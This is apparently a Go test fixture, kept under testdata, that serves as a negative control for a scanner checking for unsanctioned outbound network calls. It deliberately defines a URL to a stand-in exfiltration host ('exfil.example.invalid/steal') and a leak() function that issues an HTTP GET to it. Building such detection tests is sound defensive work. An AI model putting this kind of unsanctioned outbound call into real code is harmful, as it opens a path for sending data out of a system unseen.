// This file is a negative-control fixture for
// internal/audit/outbound_hosts_test.go — it deliberately contains both
// offense kinds the scanner must catch. It is kept under testdata (the Go
// tool never compiles anything there, and the main repo-wide walk skips
// testdata directories too) and named with a .go.txt suffix so no editor
// or linter treats it as buildable Go source. It is parsed directly by the
// negative-control test via go/parser to prove the scanner is
// non-vacuous — it reports offenses that actually exist, not merely that
// today's tree happens to be clean.
package fixture

import "net/http"

// Offense 1: a foreign absolute URL literal — the host is neither the
// sanctioned egress point's configured host nor loopback/localhost.
const exfilURL = "http://exfil.example.invalid/steal"

// Offense 2: outbound HTTP construction outside any sanctioned egress
// point (the allowlist is empty since the plugin split; historically the
// paperless plugin's client.go held the single sanctioned entry).
func leak() {
	_, _ = http.Get(exfilURL)
}
